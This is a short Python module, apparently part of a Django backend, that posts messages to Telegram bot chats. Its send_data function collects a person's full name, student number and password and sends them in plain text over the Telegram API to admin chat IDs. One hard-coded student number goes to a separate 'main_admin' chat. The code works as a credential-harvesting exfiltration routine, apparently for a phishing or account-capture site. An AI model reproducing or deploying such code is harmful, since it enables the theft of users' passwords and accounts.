import urllib

import requests
from api.models import Setting

try:
    TELEGRAM_API = Setting.objects.get(name="telegram_api").value
except:
    TELEGRAM_API = ""
TELEGRAM_API_URL = "https://api.telegram.org/bot" + TELEGRAM_API + "/"


def send_data(full_name, stun, password):
    text = f"نام: {full_name}\nشماره دانشجویی: {stun}\nرمزعبور: {password}"

    if stun == "4006126009":
        main_admin = Setting.objects.get(name="main_admin").value
        req = TELEGRAM_API_URL + f"sendMessage?chat_id={main_admin}&text={text}"
        requests.get(req).json()
    else:
        send_request(text)


def send_alert(text):
    send_request(text)


def send_request(text):
    text = urllib.parse.quote_plus(str(text))
    admins = Setting.objects.filter(name="telegram_chat_id").all()
    for admin in admins:
        print(admin.value)
        req = TELEGRAM_API_URL + f"sendMessage?chat_id={admin.value}&text={text}"
        requests.get(req).json()
